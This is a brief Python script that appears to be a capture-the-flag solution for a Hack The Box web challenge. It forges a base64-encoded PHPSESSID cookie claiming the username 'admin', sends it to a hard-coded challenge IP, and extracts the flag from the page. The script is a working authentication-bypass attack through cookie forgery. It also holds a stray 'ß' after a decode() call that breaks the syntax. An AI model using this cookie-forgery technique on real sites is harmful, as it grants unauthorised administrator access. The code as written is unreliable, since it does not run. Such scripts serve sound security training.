#!/usr/bin/env python3

import requests, base64

HOST, PORT = "83.136.255.254", 43238
CHALLENGE_URL = f"http://{HOST}:{PORT}"

def main():
    cookie_data='{"username":"admin"}'
    cookie_data_bytes = cookie_data.encode()
    
    base64_bytes = base64.b64encode(cookie_data_bytes)
    base64_string = base64_bytes.decode()ß
    
    req_cookies = {"PHPSESSID":base64_string}
    resp = requests.get(f"{CHALLENGE_URL}", cookies=req_cookies)
    html = resp.text

    flag = "HTB{" + html.split("HTB{")[1].split("}")[0] + "}"
    print(flag)

if __name__ == "__main__":
    main()
